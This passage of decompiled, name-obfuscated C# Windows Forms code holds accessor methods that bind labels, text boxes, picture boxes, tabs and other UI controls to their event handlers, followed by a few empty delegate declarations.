    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_3(Button button_2)
    {
        this.button_1 = button_2;
    }

    internal virtual Label vmethod_30()
    {
        return this.label_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_31(Label label_40)
    {
        this.label_4 = label_40;
    }

    internal virtual Label vmethod_32()
    {
        return this.label_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_33(Label label_40)
    {
        this.label_5 = label_40;
    }

    internal virtual PictureBox vmethod_34()
    {
        return this.pictureBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_35(PictureBox pictureBox_16)
    {
        EventHandler handler = new EventHandler(this.method_13);
        PictureBox box = this.pictureBox_0;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_0 = pictureBox_16;
        box = this.pictureBox_0;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual TabPage vmethod_36()
    {
        return this.tabPage_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_37(TabPage tabPage_7)
    {
        this.tabPage_2 = tabPage_7;
    }

    internal virtual Label vmethod_38()
    {
        return this.label_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_39(Label label_40)
    {
        this.label_6 = label_40;
    }

    internal virtual Splitter vmethod_4()
    {
        return this.splitter_0;
    }

    internal virtual Label vmethod_40()
    {
        return this.label_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_41(Label label_40)
    {
        this.label_7 = label_40;
    }

    internal virtual TextBox vmethod_42()
    {
        return this.textBox_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_43(TextBox textBox_20)
    {
        EventHandler handler = new EventHandler(this.method_7);
        EventHandler handler2 = new EventHandler(this.method_8);
        EventHandler handler3 = new EventHandler(this.method_12);
        TextBox box = this.textBox_4;
        if (box != null)
        {
            box.GotFocus -= handler;
            box.LostFocus -= handler2;
            box.TextChanged -= handler3;
        }
        this.textBox_4 = textBox_20;
        box = this.textBox_4;
        if (box != null)
        {
            box.GotFocus += handler;
            box.LostFocus += handler2;
            box.TextChanged += handler3;
        }
    }

    internal virtual TextBox vmethod_44()
    {
        return this.textBox_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_45(TextBox textBox_20)
    {
        EventHandler handler = new EventHandler(this.method_9);
        EventHandler handler2 = new EventHandler(this.method_10);
        EventHandler handler3 = new EventHandler(this.method_11);
        TextBox box = this.textBox_5;
        if (box != null)
        {
            box.GotFocus -= handler;
            box.LostFocus -= handler2;
            box.TextChanged -= handler3;
        }
        this.textBox_5 = textBox_20;
        box = this.textBox_5;
        if (box != null)
        {
            box.GotFocus += handler;
            box.LostFocus += handler2;
            box.TextChanged += handler3;
        }
    }

    internal virtual Label vmethod_46()
    {
        return this.label_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_47(Label label_40)
    {
        this.label_8 = label_40;
    }

    internal virtual PictureBox vmethod_48()
    {
        return this.pictureBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_49(PictureBox pictureBox_16)
    {
        EventHandler handler = new EventHandler(this.method_14);
        PictureBox box = this.pictureBox_1;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_1 = pictureBox_16;
        box = this.pictureBox_1;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_5(Splitter splitter_1)
    {
        this.splitter_0 = splitter_1;
    }

    internal virtual Label vmethod_50()
    {
        return this.label_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_51(Label label_40)
    {
        this.label_9 = label_40;
    }

    internal virtual TextBox vmethod_52()
    {
        return this.textBox_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_53(TextBox textBox_20)
    {
        EventHandler handler = new EventHandler(this.method_5);
        TextBox box = this.textBox_6;
        if (box != null)
        {
            box.TextChanged -= handler;
        }
        this.textBox_6 = textBox_20;
        box = this.textBox_6;
        if (box != null)
        {
            box.TextChanged += handler;
        }
    }

    internal virtual Label vmethod_54()
    {
        return this.label_10;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_55(Label label_40)
    {
        this.label_10 = label_40;
    }

    internal virtual TabPage vmethod_56()
    {
        return this.tabPage_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_57(TabPage tabPage_7)
    {
        this.tabPage_3 = tabPage_7;
    }

    internal virtual PictureBox vmethod_58()
    {
        return this.pictureBox_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_59(PictureBox pictureBox_16)
    {
        EventHandler handler = new EventHandler(this.method_15);
        PictureBox box = this.pictureBox_2;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_2 = pictureBox_16;
        box = this.pictureBox_2;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual TabControl vmethod_6()
    {
        return this.tabControl_0;
    }

    internal virtual CheckBox vmethod_60()
    {
        return this.checkBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_61(CheckBox checkBox_18)
    {
        EventHandler handler = new EventHandler(this.method_16);
        CheckBox box = this.checkBox_1;
        if (box != null)
        {
            box.CheckedChanged -= handler;
        }
        this.checkBox_1 = checkBox_18;
        box = this.checkBox_1;
        if (box != null)
        {
            box.CheckedChanged += handler;
        }
    }

    internal virtual RadioButton vmethod_62()
    {
        return this.radioButton_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_63(RadioButton radioButton_4)
    {
        this.radioButton_0 = radioButton_4;
    }

    internal virtual Label vmethod_64()
    {
        return this.label_11;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_65(Label label_40)
    {
        this.label_11 = label_40;
    }

    internal virtual RadioButton vmethod_66()
    {
        return this.radioButton_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_67(RadioButton radioButton_4)
    {
        this.radioButton_1 = radioButton_4;
    }

    internal virtual Label vmethod_68()
    {
        return this.label_12;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_69(Label label_40)
    {
        this.label_12 = label_40;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_7(TabControl tabControl_1)
    {
        this.tabControl_0 = tabControl_1;
    }

    internal virtual Label vmethod_70()
    {
        return this.label_13;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_71(Label label_40)
    {
        this.label_13 = label_40;
    }

    internal virtual TrackBar vmethod_72()
    {
        return this.trackBar_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_73(TrackBar trackBar_2)
    {
        EventHandler handler = new EventHandler(this.method_17);
        TrackBar bar = this.trackBar_0;
        if (bar != null)
        {
            bar.Scroll -= handler;
        }
        this.trackBar_0 = trackBar_2;
        bar = this.trackBar_0;
        if (bar != null)
        {
            bar.Scroll += handler;
        }
    }

    internal virtual Label vmethod_74()
    {
        return this.label_14;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_75(Label label_40)
    {
        this.label_14 = label_40;
    }

    internal virtual TextBox vmethod_76()
    {
        return this.textBox_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_77(TextBox textBox_20)
    {
        EventHandler handler = new EventHandler(this.method_22);
        TextBox box = this.textBox_7;
        if (box != null)
        {
            box.TextChanged -= handler;
        }
        this.textBox_7 = textBox_20;
        box = this.textBox_7;
        if (box != null)
        {
            box.TextChanged += handler;
        }
    }

    internal virtual Label vmethod_78()
    {
        return this.label_15;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_79(Label label_40)
    {
        this.label_15 = label_40;
    }

    internal virtual TabPage vmethod_8()
    {
        return this.tabPage_0;
    }

    internal virtual Label vmethod_80()
    {
        return this.label_16;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_81(Label label_40)
    {
        this.label_16 = label_40;
    }

    internal virtual TextBox vmethod_82()
    {
        return this.textBox_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_83(TextBox textBox_20)
    {
        EventHandler handler = new EventHandler(this.method_21);
        TextBox box = this.textBox_8;
        if (box != null)
        {
            box.TextChanged -= handler;
        }
        this.textBox_8 = textBox_20;
        box = this.textBox_8;
        if (box != null)
        {
            box.TextChanged += handler;
        }
    }

    internal virtual Label vmethod_84()
    {
        return this.label_17;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_85(Label label_40)
    {
        this.label_17 = label_40;
    }

    internal virtual TextBox vmethod_86()
    {
        return this.textBox_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_87(TextBox textBox_20)
    {
        EventHandler handler = new EventHandler(this.method_20);
        TextBox box = this.textBox_9;
        if (box != null)
        {
            box.TextChanged -= handler;
        }
        this.textBox_9 = textBox_20;
        box = this.textBox_9;
        if (box != null)
        {
            box.TextChanged += handler;
        }
    }

    internal virtual Label vmethod_88()
    {
        return this.label_18;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_89(Label label_40)
    {
        this.label_18 = label_40;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_9(TabPage tabPage_7)
    {
        this.tabPage_0 = tabPage_7;
    }

    internal virtual Label vmethod_90()
    {
        return this.label_19;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_91(Label label_40)
    {
        this.label_19 = label_40;
    }

    internal virtual TextBox vmethod_92()
    {
        return this.textBox_10;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_93(TextBox textBox_20)
    {
        EventHandler handler = new EventHandler(this.method_19);
        TextBox box = this.textBox_10;
        if (box != null)
        {
            box.TextChanged -= handler;
        }
        this.textBox_10 = textBox_20;
        box = this.textBox_10;
        if (box != null)
        {
            box.TextChanged += handler;
        }
    }

    internal virtual ComboBox vmethod_94()
    {
        return this.comboBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_95(ComboBox comboBox_2)
    {
        this.comboBox_0 = comboBox_2;
    }

    internal virtual Label vmethod_96()
    {
        return this.label_20;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_97(Label label_40)
    {
        this.label_20 = label_40;
    }

    internal virtual ComboBox vmethod_98()
    {
        return this.comboBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_99(ComboBox comboBox_2)
    {
        this.comboBox_1 = comboBox_2;
    }

    private delegate void Delegate58();

    private delegate void Delegate59();

    private delegate void Delegate60();

    private delegate void Delegate61();

    private delegate void Delegate62();

    public delegate void GDelegate3(bool bool_0);

    public delegate void GDelegate4(bool bool_0);
}

